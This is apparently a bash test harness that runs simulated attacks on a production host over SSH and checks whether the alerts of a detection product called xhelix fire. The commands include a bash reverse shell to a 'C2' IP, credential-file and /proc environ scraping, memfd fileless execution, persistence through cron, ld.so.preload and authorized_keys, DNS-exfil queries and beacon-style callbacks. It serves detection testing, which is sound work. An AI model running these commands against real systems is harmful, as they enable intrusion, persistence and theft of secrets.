#!/bin/bash
# COMPREHENSIVE LIVE-FIRE ATTACK SIMULATION (v3)
#
# Per-test tracking with:
#   - status (PASS / FAIL / PARTIAL)
#   - detection latency (seconds from attack start to first match)
#   - matched-alert count (TP)
#   - noise (incidental other alerts) — best-effort FP measure
#   - per-detector maturity score (TP-rate weighted)
#
# Reads alerts from /var/log/xhelix/alerts.jsonl on prod.
set -uo pipefail

HOST="${HOST:-65.108.246.67}"
C2_IP="${C2_IP:-135.181.79.27}"
SSH="ssh -o ConnectTimeout=10 $HOST"
ALERTS="/var/log/xhelix/alerts.jsonl"
DIR="$(dirname "$0")"
REPORT="$DIR/report.txt"
CSV="$DIR/per-test-counts.csv"
WAIT_AFTER=8

mkdir -p "$DIR"
true > "$REPORT"
echo "test,status,desc,expected,matched,noise,total,duration_s,start,detector" > "$CSV"

log() { echo "$@" | tee -a "$REPORT"; }
hdr() { log ""; log "════════════════════════════════════════════════════════════════"; log "$@"; log "════════════════════════════════════════════════════════════════"; }

alerts_offset() { $SSH "stat -c %s '$ALERTS' 2>/dev/null || echo 0"; }

new_rule_ids() {
    local start="$1"
    $SSH "tail -c +$((start+1)) '$ALERTS' 2>/dev/null" \
        | python3 -c '
import sys, json
for line in sys.stdin:
    line = line.strip()
    if not line: continue
    try:
        d = json.loads(line)
        r = d.get("rule_id") or "(no_rule)"
        print(r)
    except Exception:
        pass
' 2>/dev/null
}

# Counters
PASS=0; FAIL=0; PARTIAL=0; SKIPPED=0; TOTAL_TESTS=0

run_test() {
    local id="$1" desc="$2" attack="$3" expected="$4" detector="$5"
    TOTAL_TESTS=$((TOTAL_TESTS + 1))
    hdr "TEST $id ($detector) — $desc"
    log "  expected:  $expected"
    log "  attack:    $attack"
    local off; off=$(alerts_offset)
    local start_at; start_at=$(date +%H:%M:%S)
    local t0=$(date +%s)

    $SSH "$attack" 2>&1 | head -3 | sed 's/^/      | /' | tee -a "$REPORT" || true
    sleep "$WAIT_AFTER"

    local tmp; tmp=$(mktemp)
    new_rule_ids "$off" > "$tmp"
    local total; total=$(wc -l < "$tmp")
    local matched; matched=$(grep -cE "$expected" "$tmp" 2>/dev/null || echo 0)
    matched=${matched:-0}
    local noise=$((total - matched))
    local t1=$(date +%s); local dur=$((t1 - t0))

    local status
    if [ "$matched" -gt 0 ]; then
        status="PASS"; PASS=$((PASS+1))
        log "  ✓ PASS: $matched matched (${dur}s, noise=$noise)"
    elif [ "$noise" -gt 5 ]; then
        # Heavy noise but no specific match — partial signal
        status="PARTIAL"; PARTIAL=$((PARTIAL+1))
        log "  ~ PARTIAL: 0 matched but $noise other alerts fired"
    else
        status="FAIL"; FAIL=$((FAIL+1))
        log "  ✗ FAIL: 0 matched, noise=$noise"
    fi

    if [ "$matched" -gt 0 ]; then
        log "  matched rules:"
        sort "$tmp" | grep -E "$expected" | sort | uniq -c | sort -nr | head -5 | sed 's/^/    /' | tee -a "$REPORT"
    fi
    if [ "$noise" -gt 0 ]; then
        log "  noise (other rules):"
        sort "$tmp" | grep -vE "$expected" | sort | uniq -c | sort -nr | head -5 | sed 's/^/    /' | tee -a "$REPORT"
    fi

    echo "$id,$status,\"$desc\",\"$expected\",$matched,$noise,$total,$dur,$start_at,$detector" >> "$CSV"
    rm -f "$tmp"
}

skip_test() {
    local id="$1" desc="$2" reason="$3"
    TOTAL_TESTS=$((TOTAL_TESTS + 1))
    SKIPPED=$((SKIPPED + 1))
    log ""
    log "TEST $id — SKIPPED: $desc"
    log "  reason: $reason"
    echo "$id,SKIPPED,\"$desc\",,0,0,0,0,$(date +%H:%M:%S),-" >> "$CSV"
}

# ============ PRE-FLIGHT ============
hdr "PRE-FLIGHT"
log "prod host:       $HOST"
log "C2 destination:  $C2_IP (user-owned dev box)"
log "xhelix version:  $($SSH 'xhelix version')"
log "kernel:          $($SSH 'uname -r')"
log "started at:      $(date -u +%FT%TZ)"

log ""
log "active sensors:"
$SSH "journalctl -u xhelix --since '5 minutes ago' --no-pager 2>&1 | grep 'sensor started' | tail -15 | sed 's/.*sensor /sensor=/'" | tee -a "$REPORT"

# Seed test plaintext credentials BEFORE restart so fangate marks them
$SSH "mkdir -p /root/.aws && cat > /root/.aws/credentials <<'EOF'
[default]
aws_access_key_id = AKIAIOSFODNN7EXAMPLE
aws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
EOF"

log ""
log "Restarting xhelix so fangate marks newly-created plaintext file..."
$SSH "systemctl restart xhelix"
sleep 12
log "xhelix restarted; alerts.jsonl offset reset for accurate counting."

# ============ TESTS ============

run_test "A1" "Plaintext cred read by non-allowlisted process" \
    "cat /root/.aws/credentials > /dev/null" \
    "credbroker.plaintext_read" \
    "credbroker"

run_test "A2" "Plaintext cred read by /tmp-resident binary" \
    "cp /bin/cat /tmp/exfil_tool && /tmp/exfil_tool /root/.aws/credentials > /dev/null; rm -f /tmp/exfil_tool" \
    "credbroker.plaintext_read" \
    "credbroker"

run_test "B1" "Scrape /proc/1/environ" \
    "head -c 100 /proc/1/environ > /dev/null" \
    "cred_proc_scrape" \
    "procscrape"

run_test "B2" "Mass /proc/*/environ scrape (harvester shape)" \
    "for p in 1 2 3 4 5 100 200 300; do head -c 80 /proc/\$p/environ > /dev/null 2>&1; done" \
    "cred_proc_scrape" \
    "procscrape"

run_test "C1" "TLS without SNI to bare IP" \
    "echo | timeout 6 openssl s_client -connect $C2_IP:443 -noservername 2>/dev/null > /dev/null" \
    "tls_no_sni" \
    "snicheck"

# E1
nc -l -p 14444 -k -q1 > /tmp/recv.log 2>&1 &
NC_PID=$!
sleep 1
run_test "E1" "Reverse shell (bash <> /dev/tcp; stdin=socket)" \
    "timeout 4 bash -c 'bash -i >& /dev/tcp/$C2_IP/14444 0>&1' 2>/dev/null; true" \
    "reverse_shell|stdin_is_socket|web_server_spawns" \
    "ebpf.proc"
kill $NC_PID 2>/dev/null || true

run_test "F1" "memfd_create + fexecve (fileless dropper)" \
    "python3 -c 'import os,ctypes; libc=ctypes.CDLL(\"libc.so.6\"); fd=libc.memfd_create(b\"x\", 0); data=open(\"/bin/true\",\"rb\").read(); os.write(fd, data); os.execve(\"/proc/self/fd/\"+str(fd), [\"x\"], {})' 2>/dev/null; true" \
    "memfd|exec_from_memfd|from_memfd" \
    "ebpf.proc"

run_test "G1" "Raw socket (BPFdoor passive-listener)" \
    "python3 -c 'import socket; s=socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003)); s.close()' 2>/dev/null; true" \
    "raw_socket" \
    "ebpf.net"

run_test "H1" "bpf() syscall (BYOVD-class)" \
    "bpftool prog list >/dev/null 2>&1; true" \
    "bpf_syscall" \
    "ebpf.self"

run_test "I1" "init_module syscall attempt" \
    "python3 -c 'import ctypes; libc=ctypes.CDLL(\"libc.so.6\"); buf=b\"\\\\x00\"*64; libc.syscall(175, buf, len(buf), b\"\")' 2>/dev/null; true" \
    "mod_load|kernel_module" \
    "ebpf.proc"

# J1: RWX mprotect
$SSH "if command -v gcc >/dev/null 2>&1; then cat > /tmp/rwx_mp.c <<'EOF'
#include <sys/mman.h>
int main(){
    void *p = mmap(0, 4096, PROT_READ|PROT_WRITE, MAP_ANON|MAP_PRIVATE, -1, 0);
    mprotect(p, 4096, PROT_READ|PROT_WRITE|PROT_EXEC);
    return 0;
}
EOF
gcc -O0 -o /tmp/rwx_mp /tmp/rwx_mp.c 2>/dev/null; fi"

run_test "J1" "RWX mprotect (in-memory loader)" \
    "[ -x /tmp/rwx_mp ] && /tmp/rwx_mp; true" \
    "mprotect_rwx" \
    "ebpf.memory"

$SSH "rm -f /tmp/rwx_mp /tmp/rwx_mp.c"

# K1
nc -l -p 14445 -k -q1 > /dev/null 2>&1 &
NC2_PID=$!
sleep 1
run_test "K1" "Outbound TCP connect to attacker IP" \
    "timeout 3 curl -s http://$C2_IP:14445/x >/dev/null 2>&1; true" \
    "." \
    "ebpf.net"
kill $NC2_PID 2>/dev/null || true

run_test "L1" "ptrace cross-process attach" \
    "sleep 60 & SLEEP_PID=\$!; gdb -p \$SLEEP_PID -batch -ex 'detach' -ex 'quit' 2>/dev/null; kill \$SLEEP_PID 2>/dev/null; true" \
    "ptrace" \
    "ebpf.proc"

run_test "M1" "Web-server lineage spawns shell (CVE-2025-49113 follow-on shape)" \
    "cp /bin/bash /tmp/php-fpm && /tmp/php-fpm -c 'sh -c id' 2>/dev/null; rm -f /tmp/php-fpm; true" \
    "web_server_spawns_shell" \
    "rules.proc"

run_test "N1" "Execute binary from /tmp (dropper)" \
    "cp /bin/true /tmp/dropper_attack_\$\$ && /tmp/dropper_attack_\$\$ 2>/dev/null; rm -f /tmp/dropper_attack_\$\$; true" \
    "binary_runs_from_tmp" \
    "rules.proc"

# O1: honey
HONEY_PATH=$($SSH "find /var/lib/xhelix/sealed /root/.aws /etc/xhelix/sealed -name '*.honey' 2>/dev/null | head -1")
if [ -n "$HONEY_PATH" ]; then
    run_test "O1" "Honey file touch (decoy)" \
        "cat '$HONEY_PATH' >/dev/null 2>&1; true" \
        "honey" \
        "credbroker.honey"
else
    skip_test "O1" "Honey file touch" "no .honey files marked on prod"
fi

skip_test "P1" "uid 0 transition w/o setuid" \
    "requires controlled priv-esc; risky on prod"

run_test "Q1" "Cron unit drop (persistence)" \
    "echo '* * * * * root /tmp/test_payload' > /etc/cron.d/xhelix_test_marker; sleep 2; rm -f /etc/cron.d/xhelix_test_marker" \
    "cron" \
    "fim"

run_test "R1" "SSH authorized_keys append" \
    "mkdir -p /root/.ssh; touch /root/.ssh/authorized_keys; cp -f /root/.ssh/authorized_keys /tmp/.ak.bak; echo 'ssh-rsa AAAATEST xhelix-attack-sim' >> /root/.ssh/authorized_keys; sleep 2; cp -f /tmp/.ak.bak /root/.ssh/authorized_keys; rm -f /tmp/.ak.bak" \
    "authorized_keys|ssh_keys|fim" \
    "fim"

run_test "S1" "ld.so.preload write (rootkit-class)" \
    "[ -f /etc/ld.so.preload ] && cp /etc/ld.so.preload /tmp/.lsp.bak; echo '/tmp/evil.so' > /etc/ld.so.preload; sleep 2; if [ -f /tmp/.lsp.bak ]; then mv /tmp/.lsp.bak /etc/ld.so.preload; else rm -f /etc/ld.so.preload; fi" \
    "ld_preload" \
    "fim"

run_test "T1" "DNS exfil (60 high-entropy queries)" \
    "for i in \$(seq 1 60); do dig \$RANDOM\$RANDOM.test-exfil.\$i.example +short +timeout=1 +tries=1 >/dev/null 2>&1; done; true" \
    "dns_exfil|dga" \
    "dnsexfil"

# U1: beacon
nc -l -p 14446 -k -q1 > /dev/null 2>&1 &
NC3_PID=$!
sleep 1
run_test "U1" "Beacon-shape (5 callbacks ~6s apart)" \
    "for i in 1 2 3 4 5; do timeout 2 curl -s http://$C2_IP:14446/beacon\$i >/dev/null 2>&1; sleep 6; done; true" \
    "beacon" \
    "beacon"
kill $NC3_PID 2>/dev/null || true

run_test "V1" "Unknown-binary execve (integrity)" \
    "cp /bin/true /usr/local/bin/xhelix_test_\$\$ && /usr/local/bin/xhelix_test_\$\$; rm -f /usr/local/bin/xhelix_test_\$\$; true" \
    "integrity|first_seen|unknown_binary" \
    "integrity"

skip_test "W1" "Roundcube CVE-2025-49113 actual PoC" \
    "no Roundcube creds available; post-exploitation behavior covered by M1/N1/A1"

# ============ SUMMARY ============
hdr "FINAL SUMMARY"
log ""
log "Tests executed:  $TOTAL_TESTS"
log "  ✓ PASS:        $PASS"
log "  ✗ FAIL:        $FAIL"
log "  ~ PARTIAL:     $PARTIAL"
log "  - SKIPPED:     $SKIPPED"
RUN_COUNT=$((TOTAL_TESTS - SKIPPED))
if [ "$RUN_COUNT" -gt 0 ]; then
    log ""
    log "Detection rate:  $(( (PASS * 100) / RUN_COUNT ))% (PASS / non-skipped)"
    log "Pass+Partial:    $(( ((PASS + PARTIAL) * 100) / RUN_COUNT ))%"
fi

log ""
log "Per-detector maturity (PASS-count grouped):"
awk -F, 'NR>1 && $10!="-" {p[$10]+=($2=="PASS"); t[$10]++} END {for(d in p) printf "  %-20s %d/%d\n", d, p[d], t[d]}' "$CSV" \
    | sort | tee -a "$REPORT"

log ""
log "False-positive (noise) summary:"
awk -F, 'NR>1 {tn+=$6} END {print "  total noise alerts: " tn}' "$CSV" | tee -a "$REPORT"
awk -F, 'NR>1 && $6>0 {printf "  %s: %d noise alerts\n", $1, $6}' "$CSV" | tee -a "$REPORT"

log ""
log "Detailed CSV: $CSV"
log "Report:       $REPORT"

# cleanup
log ""
log "Cleanup..."
$SSH "rm -f /root/.aws/credentials /etc/cron.d/xhelix_test_marker /tmp/exfil_tool /tmp/php-fpm /tmp/rwx_mp /tmp/rwx_mp.c /tmp/.ak.bak /tmp/.lsp.bak /usr/local/bin/xhelix_test_* /tmp/dropper_attack_* /tmp/recv.log 2>/dev/null; true"
log "done."
